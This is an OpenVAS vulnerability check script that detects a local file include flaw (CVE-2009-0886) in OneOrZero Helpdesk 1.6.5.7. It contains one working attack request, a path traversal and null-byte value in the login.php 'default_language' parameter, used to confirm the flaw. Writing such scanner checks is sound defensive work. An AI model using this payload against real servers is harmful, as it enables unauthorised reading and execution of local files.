###############################################################################
# OpenVAS Vulnerability Test
# $Id: OneOrZero_helpdesk_local_file_include.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# OneOrZero Helpdesk 'login.php' Local File Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "OneOrZero Helpdesk is prone to a local file-include vulnerability
  because it fails to properly sanitize user-supplied input.

  An attacker can exploit this vulnerability to view and execute
  arbitrary local files in the context of the webserver process. This
  may aid in further attacks.

  OneOrZero Helpdesk 1.6.5.7 is vulnerable; other versions may also be
  affected.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100026");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_cve_id("CVE-2009-0886");
 script_bugtraq_id(34029);
 script_name("OneOrZero Helpdesk 'login.php' Local File Include Vulnerability");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/oozv1657", "/helpdesk", cgi_dirs( port:port ) ) ) { 

  if( dir == "/" ) dir = "";
  url = string(dir, "/common/login.php?default_language=/../../supporter/timer.js%00");

  if(http_vuln_check(port:port, url:url,pattern:"^var.timeSpent.=.[0-9]+;.*$")) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
